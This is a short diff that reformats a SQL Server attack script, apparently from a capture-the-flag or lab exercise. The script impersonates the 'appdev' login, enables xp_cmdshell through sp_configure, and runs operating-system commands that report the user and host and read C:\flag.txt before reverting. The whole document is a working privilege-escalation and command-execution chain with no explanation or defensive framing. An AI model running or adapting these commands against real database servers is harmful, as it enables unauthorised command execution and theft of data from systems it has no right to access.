@@ -1,9 +1,9 @@
-1> EXECUTE AS LOGIN = 'appdev';
-2> GO
-1> EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
-2> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-3> GO
-1> EXEC xp_cmdshell 'whoami /user && hostname && type C:\flag.txt';
-2> GO
-1> REVERT;
-2> GO
+EXECUTE AS LOGIN = 'appdev';
+GO
+EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+GO
+EXEC xp_cmdshell 'whoami /user && hostname && type C:\flag.txt';
+GO
+REVERT;
+GO
